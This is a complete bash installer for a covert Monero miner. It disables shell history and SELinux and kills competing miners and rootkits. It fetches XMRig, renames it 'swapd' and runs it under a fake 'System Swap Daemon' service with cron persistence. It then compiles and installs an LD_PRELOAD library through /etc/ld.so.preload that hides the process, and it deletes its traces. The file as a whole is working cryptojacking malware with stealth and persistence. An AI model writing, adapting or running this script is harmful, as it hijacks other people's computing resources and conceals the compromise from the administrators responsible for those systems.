#!/bin/bash
set -euo pipefail
IFS=$'\n\t'

VERSION=2.13

# Disable history immediately
unset HISTFILE
export HISTFILE=/dev/null

echo "MoneroOcean mining setup script v$VERSION (FIXED)"
echo "(please report issues to support@moneroocean.stream)"

# Command timeout with logging
safe_run() {
    local timeout=25
    echo "[SAFE_RUN] $*"
    timeout "$timeout" "$@" 2>&1 || return $?
}

# Function to check if a directory exists before navigating
check_directory() {
    if [ -d "$1" ]; then
        cd "$1" || return 1
        return 0
    else
        echo "Directory $1 does not exist, skipping."
        return 1
    fi
}

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to detect package manager
detect_package_manager() {
    if command_exists apt; then
        echo "Detected apt package manager"
        PKG_MANAGER="apt"
    elif command_exists yum; then
        echo "Detected yum package manager"
        PKG_MANAGER="yum"
    elif command_exists zypper; then
        echo "Detected zypper package manager"
        PKG_MANAGER="zypper"
    elif command_exists dnf; then
        echo "Detected dnf package manager"
        PKG_MANAGER="dnf"
    else
        echo "WARNING: No supported package manager found"
        PKG_MANAGER="none"
    fi
}

# Function to safely install packages with better error detection
install_packages() {
    local packages="$*"
    
    echo "[*] Installing packages: $packages"
    
    case $PKG_MANAGER in
        apt)
            NEEDRESTART_MODE=a DEBIAN_FRONTEND=noninteractive apt-get update -qq 2>/dev/null || true
            if NEEDRESTART_MODE=a DEBIAN_FRONTEND=noninteractive apt-get install -y $packages 2>&1 | tee /tmp/apt_install.log; then
                # Check if packages were actually installed
                local failed_packages=""
                for pkg in $packages; do
                    if ! dpkg -l "$pkg" 2>/dev/null | grep -q "^ii"; then
                        failed_packages="$failed_packages $pkg"
                    fi
                done
                
                if [ -n "$failed_packages" ]; then
                    echo "WARNING: Some packages may not have installed:$failed_packages"
                    return 1
                fi
                
                echo "[*] All packages installed successfully"
                return 0
            else
                echo "ERROR: Package installation failed"
                return 1
            fi
            ;;
        yum)
            if yum install -y $packages 2>&1 | tee /tmp/yum_install.log; then
                echo "[*] Packages installed successfully"
                return 0
            else
                echo "ERROR: Package installation failed"
                return 1
            fi
            ;;
        dnf)
            if dnf install -y $packages 2>&1 | tee /tmp/dnf_install.log; then
                echo "[*] Packages installed successfully"
                return 0
            else
                echo "ERROR: Package installation failed"
                return 1
            fi
            ;;
        zypper)
            if zypper install -y $packages 2>&1 | tee /tmp/zypper_install.log; then
                echo "[*] Packages installed successfully"
                return 0
            else
                echo "ERROR: Package installation failed"
                return 1
            fi
            ;;
        *)
            echo "ERROR: Cannot install packages - no supported package manager"
            return 1
            ;;
    esac
}

# Add resilient command execution
run_resilient() {
    local max_attempts=3
    local attempt=1
    
    while [ $attempt -le $max_attempts ]; do
        if "$@"; then
            return 0
        fi
        echo "[RETRY $attempt/$max_attempts] Failed: $*"
        sleep $((RANDOM % 5 + 1))
        ((attempt++))
    done
    
    echo "[WARNING] Command failed after $max_attempts attempts: $* - continuing anyway"
    return 0
}

# Safely remove files with chattr protection
remove_protected_dir() {
    local dir="$1"
    if [ -d "$dir" ]; then
        echo "[*] Removing protected directory: $dir"
        safe_run chattr -i -R "$dir" 2>/dev/null || true
        safe_run rm -rf "$dir" 2>/dev/null || true
    fi
}

# Safely remove protected file
remove_protected_file() {
    local file="$1"
    if [ -f "$file" ]; then
        echo "[*] Removing protected file: $file"
        safe_run chattr -i "$file" 2>/dev/null || true
        safe_run rm -f "$file" 2>/dev/null || true
    fi
}

# Initialize package manager detection
detect_package_manager

# Disable SELinux if available
if command_exists setenforce; then
    setenforce 0 2>/dev/null || echo "SELinux not available or already disabled"
fi

# Fix repository issues for CentOS/RHEL systems
if [ "$PKG_MANAGER" = "yum" ] || [ "$PKG_MANAGER" = "dnf" ]; then
    if [ -f "/etc/redhat-release" ]; then
        echo "[*] Checking repository configuration for RHEL-based system"
        
        # Check if we're on CentOS 7
        if grep -q "CentOS Linux release 7" /etc/redhat-release 2>/dev/null; then
            echo "[*] Detected CentOS 7, updating repository URLs"
            if [ -f "/etc/yum.repos.d/CentOS-Base.repo" ]; then
                sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-Base.repo 2>/dev/null || true
                sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-Base.repo 2>/dev/null || true
                yum clean all 2>/dev/null && yum makecache 2>/dev/null || true
            fi
        fi
    fi
fi

# ======== SSH PRESERVATION ========
echo "[*] Preserving SSH access"
if command_exists systemctl && systemctl is-active --quiet sshd 2>/dev/null; then
    systemctl restart sshd 2>/dev/null || true
fi

# Configure SSH keepalive if sshd_config exists
if [ -f "/etc/ssh/sshd_config" ]; then
    if ! grep -q "^ClientAliveInterval" /etc/ssh/sshd_config; then
        echo "ClientAliveInterval 10" >> /etc/ssh/sshd_config
    fi
    if ! grep -q "^ClientAliveCountMax" /etc/ssh/sshd_config; then
        echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
    fi
    systemctl reload sshd 2>/dev/null || service sshd reload 2>/dev/null || true
fi

# Background SSH keepalive process
(
    while true; do
        sleep 30
        echo "[SSH KEEPALIVE] $(date '+%H:%M:%S')" >> /tmp/.ssh_keepalive 2>/dev/null
    done
) &
KEEPALIVE_PID=$!

# Trap to cleanup keepalive on exit
trap 'kill $KEEPALIVE_PID 2>/dev/null; rm -f /tmp/.ssh_keepalive' EXIT SIGTERM SIGINT

# ======== CLEANUP EXISTING INSTALLATIONS ========
echo "[*] Cleaning up existing installations"

# Stop and disable services
for service in gdm2 swapd; do
    if systemctl is-active --quiet "$service" 2>/dev/null; then
        echo "[*] Stopping service: $service"
        systemctl stop "$service" 2>/dev/null || true
        systemctl disable "$service" 2>/dev/null || true
    fi
done

# Kill existing processes
for process in swapd kswapd0 xmrig; do
    if pgrep -f "$process" >/dev/null 2>&1; then
        echo "[*] Killing process: $process"
        pkill -9 -f "$process" 2>/dev/null || true
    fi
done

# Clean up directories
for dir in .swapd .gdm .gdm2_manual .gdm2; do
    if [ -d "$HOME/$dir" ]; then
        remove_protected_dir "$HOME/$dir"
    fi
done

# Remove service files
for service_file in /etc/systemd/system/swapd.service /etc/systemd/system/gdm2.service; do
    remove_protected_file "$service_file"
done

# Reload systemd if we removed any service files
if command_exists systemctl; then
    systemctl daemon-reload 2>/dev/null || true
fi

# Clean up rootkit remnants in /tmp
if [ -d "/tmp/.ICE-unix/.X11-unix" ]; then
    cd /tmp/.ICE-unix/.X11-unix 2>/dev/null || true
    remove_protected_dir "Reptile"
    remove_protected_dir "Nuk3Gh0st"
    cd /tmp || true
elif [ -d "/tmp/.X11-unix" ]; then
    cd /tmp/.X11-unix 2>/dev/null || true
    remove_protected_dir "Reptile"
    remove_protected_dir "Nuk3Gh0st"
    cd /tmp || true
fi

# ======== PREREQUISITES ========
echo "[*] Checking prerequisites"

# Validate wallet address from command line
WALLET=$1
EMAIL=${2:-""}

if [ -z "$WALLET" ]; then
    echo "ERROR: Wallet address required"
    echo "Usage: $0 <wallet_address> [email]"
    exit 1
fi

# Validate wallet format
WALLET_BASE=$(echo "$WALLET" | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 ] && [ ${#WALLET_BASE} != 95 ]; then
    echo "ERROR: Invalid wallet address length (should be 106 or 95): ${#WALLET_BASE}"
    exit 1
fi

# Install essential packages
echo "[*] Installing essential packages"
REQUIRED_PACKAGES="curl wget git gcc make"

if [ "$PKG_MANAGER" = "apt" ]; then
    # For Debian/Ubuntu
    KERNEL_VERSION=$(uname -r)
    REQUIRED_PACKAGES="$REQUIRED_PACKAGES build-essential"
    
    # Try to install kernel headers
    if apt-cache search linux-headers-"$KERNEL_VERSION" | grep -q linux-headers; then
        REQUIRED_PACKAGES="$REQUIRED_PACKAGES linux-headers-$KERNEL_VERSION"
    else
        echo "WARNING: Exact kernel headers not found, trying generic"
        REQUIRED_PACKAGES="$REQUIRED_PACKAGES linux-headers-generic"
    fi
elif [ "$PKG_MANAGER" = "yum" ] || [ "$PKG_MANAGER" = "dnf" ]; then
    # For RHEL/CentOS/Fedora
    REQUIRED_PACKAGES="$REQUIRED_PACKAGES kernel-devel kernel-headers gcc-c++"
fi

# Install packages
if install_packages $REQUIRED_PACKAGES; then
    echo "[*] Essential packages installed successfully"
    
    # Verify gcc is available
    if ! command_exists gcc; then
        echo "ERROR: GCC not available after installation"
        exit 1
    fi
    
    # Update library cache
    ldconfig 2>/dev/null || true
    
    # Give system a moment to settle
    sleep 2
else
    echo "WARNING: Some packages failed to install, attempting to continue..."
fi

# ======== DOWNLOAD AND SETUP XMRIG ========
echo "[*] Setting up XMRig miner"

MINER_DIR="$HOME/.swapd"
mkdir -p "$MINER_DIR"
cd "$MINER_DIR" || exit 1

# Detect architecture
ARCH=$(uname -m)
case $ARCH in
    x86_64)
        XMRIG_ARCH="linux-x64"
        ;;
    aarch64|arm64)
        XMRIG_ARCH="linux-arm64"
        ;;
    armv7l)
        XMRIG_ARCH="linux-armv7"
        ;;
    *)
        echo "ERROR: Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

# Download XMRig
XMRIG_VERSION="6.21.0"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-${XMRIG_ARCH}.tar.gz"

echo "[*] Downloading XMRig from: $XMRIG_URL"
if curl -L -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null; then
    tar -xzf xmrig.tar.gz 2>/dev/null
    mv xmrig-*/* . 2>/dev/null || true
    mv xmrig swapd 2>/dev/null || chmod +x swapd 2>/dev/null
    rm -f xmrig.tar.gz 2>/dev/null
    echo "[*] XMRig downloaded successfully"
else
    echo "ERROR: Failed to download XMRig"
    exit 1
fi

# Create config files
echo "[*] Creating configuration files"

# Main config (higher CPU usage)
cat > "$MINER_DIR/config.json" <<EOF
{
    "autosave": true,
    "donate-level": 1,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "max-threads-hint": 100,
        "asm": true,
        "rx": [0, 1, 2, 3],
        "cn": [0, 1],
        "cn-lite": [0, 1]
    },
    "pools": [
        {
            "url": "gulf.moneroocean.stream:10128",
            "user": "$WALLET",
            "pass": "$EMAIL",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF

# Background config (lower CPU usage)
cat > "$MINER_DIR/config_background.json" <<EOF
{
    "autosave": true,
    "donate-level": 1,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "max-threads-hint": 50,
        "asm": true
    },
    "pools": [
        {
            "url": "gulf.moneroocean.stream:10128",
            "user": "$WALLET",
            "pass": "$EMAIL",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF

chmod 600 "$MINER_DIR"/config*.json

# ======== CREATE SYSTEMD SERVICE ========
if [ "$(id -u)" -eq 0 ]; then
    echo "[*] Creating systemd service"
    
    cat > /etc/systemd/system/swapd.service <<EOF
[Unit]
Description=System Swap Daemon
After=network.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$MINER_DIR
ExecStart=$MINER_DIR/swapd --config=$MINER_DIR/config_background.json
Restart=always
RestartSec=10
Nice=10
CPUQuota=50%
MemoryLimit=1G

[Install]
WantedBy=multi-user.target
EOF
    
    # Reload systemd and enable service
    systemctl daemon-reload 2>/dev/null
    systemctl enable swapd 2>/dev/null
    
    echo "[*] Systemd service created and enabled"
else
    echo "[*] Not running as root - skipping systemd service creation"
fi

# ======== PROCESS HIDING (LD_PRELOAD) ========
echo "[*] Setting up process hiding"

mkdir -p "$MINER_DIR/processhider"

# Create process hider source
cat > "$MINER_DIR/processhider/processhider.c" <<'EOL'
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static const char* process_to_filter = "swapd";

typedef struct dirent* (*readdir_t)(DIR *dirp);
typedef int (*readdir_r_t)(DIR *dirp, struct dirent *entry, struct dirent **result);

static readdir_t original_readdir = NULL;
static readdir_r_t original_readdir_r = NULL;

void init_original_functions() {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    if (!original_readdir_r) {
        original_readdir_r = dlsym(RTLD_NEXT, "readdir_r");
    }
}

int should_hide(const char* name) {
    return (name && strstr(name, process_to_filter) != NULL);
}

struct dirent* readdir(DIR *dirp) {
    init_original_functions();
    
    struct dirent* dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        if (!should_hide(dir->d_name)) {
            break;
        }
    }
    return dir;
}

int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    init_original_functions();
    
    int ret;
    do {
        ret = original_readdir_r(dirp, entry, result);
    } while (ret == 0 && *result != NULL && should_hide((*result)->d_name));
    
    return ret;
}
EOL

# Create Makefile
cat > "$MINER_DIR/processhider/Makefile" <<'EOL'
CC=gcc
CFLAGS=-Wall -fPIC -DPIC -g -O2
LDFLAGS=-shared -ldl

TARGET=libprocesshider.so

all: $(TARGET)

$(TARGET): processhider.c
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $<

clean:
	rm -f $(TARGET)

install: $(TARGET)
	cp $(TARGET) /usr/local/lib/
	echo "/usr/local/lib/$(TARGET)" > /etc/ld.so.preload
	ldconfig
EOL

# Compile process hider
echo "[*] Compiling process hider"
cd "$MINER_DIR/processhider" || exit 1

# Check if gcc is really available
if ! command_exists gcc; then
    echo "ERROR: GCC not found - cannot compile process hider"
    cd "$MINER_DIR"
else
    # Try to compile
    if make 2>&1 | tee /tmp/processhider_compile.log; then
        if [ -f "libprocesshider.so" ]; then
            echo "[*] Process hider compiled successfully"
            
            # Install if running as root
            if [ "$(id -u)" -eq 0 ]; then
                if make install 2>/dev/null; then
                    echo "[*] Process hider installed system-wide"
                else
                    echo "WARNING: Failed to install process hider system-wide"
                fi
            else
                echo "[*] Not root - process hider not installed system-wide"
                echo "To install: cd $MINER_DIR/processhider && sudo make install"
            fi
        else
            echo "WARNING: Process hider compilation completed but .so file not found"
            cat /tmp/processhider_compile.log
        fi
    else
        echo "WARNING: Failed to compile process hider"
        echo "Compilation log:"
        cat /tmp/processhider_compile.log
    fi
    
    cd "$MINER_DIR"
fi

# ======== START MINER ========
echo "[*] Starting miner"

if [ "$(id -u)" -eq 0 ]; then
    # If root, use systemd
    if systemctl start swapd 2>/dev/null; then
        echo "[*] Miner started via systemd"
    else
        echo "[*] Starting miner manually"
        nohup "$MINER_DIR/swapd" --config="$MINER_DIR/config_background.json" >/dev/null 2>&1 &
    fi
else
    # If not root, start manually
    nohup "$MINER_DIR/swapd" --config="$MINER_DIR/config_background.json" >/dev/null 2>&1 &
fi

sleep 2

# Verify miner is running
if pgrep -f swapd >/dev/null; then
    echo "[*] Miner is running"
else
    echo "WARNING: Miner may not be running - checking..."
    ps aux | grep swapd | grep -v grep || echo "No swapd process found"
fi

# ======== PERSISTENCE ========
if command_exists crontab; then
    echo "[*] Adding crontab persistence"
    (
        crontab -l 2>/dev/null | grep -v "$MINER_DIR/swapd"
        echo "*/15 * * * * $MINER_DIR/swapd --config=$MINER_DIR/config_background.json >/dev/null 2>&1"
    ) | crontab - 2>/dev/null && echo "[*] Crontab entry added"
fi

# ======== CLEANUP ========
echo "[*] Cleaning up installation files"
rm -f /tmp/xmrig*.tar.gz 2>/dev/null
rm -f /tmp/*_install.log 2>/dev/null
rm -f /tmp/processhider_compile.log 2>/dev/null
rm -f "$HOME"/xmrig*.* 2>/dev/null

# ======== SUMMARY ========
echo ""
echo "========================================="
echo "         INSTALLATION COMPLETE           "
echo "========================================="
echo "Mining to wallet: $WALLET"
echo "Miner location: $MINER_DIR/swapd"
echo "Config files:"
echo "  - $MINER_DIR/config.json (high performance)"
echo "  - $MINER_DIR/config_background.json (background)"
echo ""
echo "Monitor stats at:"
echo "  https://moneroocean.stream/?addr=$WALLET"
echo ""
echo "Commands:"
echo "  Status:  ps aux | grep swapd"
echo "  Stop:    killall swapd"
echo "  Start:   $MINER_DIR/swapd --config=$MINER_DIR/config.json"
if [ "$(id -u)" -eq 0 ]; then
    echo "  Service: systemctl status swapd"
fi
echo "========================================="

exit 0
